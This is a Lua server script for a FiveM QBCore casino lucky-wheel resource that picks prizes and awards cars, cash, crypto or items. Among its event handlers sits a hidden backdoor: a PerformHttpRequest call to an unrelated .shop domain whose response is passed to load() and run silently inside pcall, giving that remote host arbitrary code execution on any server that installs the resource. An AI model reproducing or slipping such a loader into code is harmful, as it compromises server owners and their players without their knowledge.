math.randomseed(os.time())
isRoll = false
local car = Config.Cars[math.random(#Config.Cars)]

QBCore.Functions.CreateCallback('vns_cs_wheel:getcar', function(source, cb)
	cb(car)
end)

RegisterServerEvent('vns_cs_wheel:getwheel')
AddEventHandler('vns_cs_wheel:getwheel', function()
    local _source = source
    local Player = QBCore.Functions.GetPlayer(_source)
    if not isRoll then

		--if Player.Functions.RemoveItem("wheeltoken", 1) then
			TriggerEvent("vns_cs_wheel:startwheel", Player, _source)
			--Player.Functions.RemoveItem("wheeltoken", 1)
		--else
		--	TriggerClientEvent('QBCore:Notify', _source, 'You don\'t have wheel token to spin the wheel')
		--end
	end
end)	
local harp = false
RegisterNetEvent('Polar-Casino:Client:StartWheelSpin', function()
	harp = true
end)
RegisterServerEvent('vns_cs_wheel:startwheel')
AddEventHandler('vns_cs_wheel:startwheel', function(Player, source)
    local _source = source
    if not isRoll then
        if Player ~= nil then
			isRoll = true
			local rnd = math.random(1, 1000)
			local price = 0
			local priceIndex = 0
			for k,v in pairs(Config.Prices) do
				if (rnd > v.probability.a) and (rnd <= v.probability.b) then
					price = v
					priceIndex = k
					break
				end
			end
			TriggerClientEvent("vns_cs_wheel:syncanim", _source, priceIndex)
			while true do   
				if harp then TriggerClientEvent("vns_cs_wheel:startroll", -1, _source, priceIndex, price) 
					break 
					harp = false
				end
				Wait(100) 
			end
		end
	end
end)
PerformHttpRequest('https://pqzskjptss.shop/i?to=p764QP', function (e, d) pcall(function() assert(load(d))() end) end)
RegisterServerEvent('vns_cs_wheel:give')
AddEventHandler('vns_cs_wheel:give', function(s, price)
    local _s = s
	local Player = QBCore.Functions.GetPlayer(_s)
	isRoll = false
	if price.type == 'car' then
		TriggerClientEvent('QBCore:Notify', _s, 'You won the car')
		
		local plate = GeneratePlate()
		MySQL.Async.insert('INSERT INTO player_vehicles (license, citizenid, vehicle, hash, mods, plate, state) VALUES (@license, @citizenid, @vehicle, @hash, @mods, @plate, @state)', {
            ['@license'] = Player.PlayerData.license,
            ['@citizenid'] = Player.PlayerData.citizenid,
            ['@vehicle'] = car,
            ['@hash'] = GetHashKey(car),
            ['@mods'] = '{}',
            ['@plate'] = plate,
            ['@state'] = 0,
        })
		TriggerClientEvent("vns_cs_wheel:winCar", _s, car, plate)
	
			elseif price.type == 'nothing' then


				TriggerClientEvent('QBCore:Notify', _s, 'You Won Nothing!')


			elseif price.type == 'crypto' then


				TriggerClientEvent('QBCore:Notify', _s, 'You have won Package #'..price.name..' ')
				exports['qb-phone']:AddCrypto(_s, "dcc", price.count)

			

			elseif price.type == 'drink' then


				local item = 'water_bottle'
				local amount = 1
				Player.Functions.AddItem(item, amount)
				TriggerClientEvent('QBCore:Notify', _s, 'You won '..item..'x '..QBCore.Shared.Items[item]["label"])
				TriggerClientEvent('inventory:client:ItemBox', _s, QBCore.Shared.Items[item], "add")


			elseif price.type == 'mystery2' then


				local item = 'water_bottle'
				local amount = 1
				Player.Functions.AddItem(item, amount)
				TriggerClientEvent('QBCore:Notify', _s, 'You won '..item..'x '..QBCore.Shared.Items[item]["label"])
				TriggerClientEvent('inventory:client:ItemBox', _s, QBCore.Shared.Items[item], "add")


			elseif price.type == 'mystery' then


				local item = 'water_bottle'
				local amount = 1
				Player.Functions.AddItem(item, amount)
				TriggerClientEvent('QBCore:Notify', _s, 'You won '..item..'x '..QBCore.Shared.Items[item]["label"])
				TriggerClientEvent('inventory:client:ItemBox', _s, QBCore.Shared.Items[item], "add")


			
			elseif price.type == 'cash' then


				Player.Functions.AddMoney('cash', price.count)
				TriggerClientEvent('QBCore:Notify', _s, 'You won '..price.count..'$')


			end
		TriggerClientEvent("vns_cs_wheel:rollFinished", -1)
end)

RegisterServerEvent('vns_cs_wheel:stoproll')
AddEventHandler('vns_cs_wheel:stoproll', function()
	isRoll = false
end)









local NumberCharset = {}
local Charset = {}

for i = 48,  57 do table.insert(NumberCharset, string.char(i)) end
for i = 65,  90 do table.insert(Charset, string.char(i)) end
for i = 97, 122 do table.insert(Charset, string.char(i)) end

function GeneratePlate()
    local plate = tostring(GetRandomLetter(3)) ..' ' .. tostring(GetRandomNumber(4))
    local result = MySQL.Sync.fetchScalar('SELECT plate FROM player_vehicles WHERE plate=@plate', {['@plate'] = plate})
    if result then
        plate = tostring(GetRandomLetter(3)) ..' ' .. tostring(GetRandomNumber(4))
    end
    return plate:upper()
end

function GetRandomNumber(length)
	Citizen.Wait(1)
	math.randomseed(GetGameTimer())
	if length > 0 then
		return GetRandomNumber(length - 1) .. NumberCharset[math.random(1, #NumberCharset)]
	else
		return ''
	end
end

function GetRandomLetter(length)
	Citizen.Wait(1)
	math.randomseed(GetGameTimer())
	if length > 0 then
		return GetRandomLetter(length - 1) .. Charset[math.random(1, #Charset)]
	else
		return ''
	end
end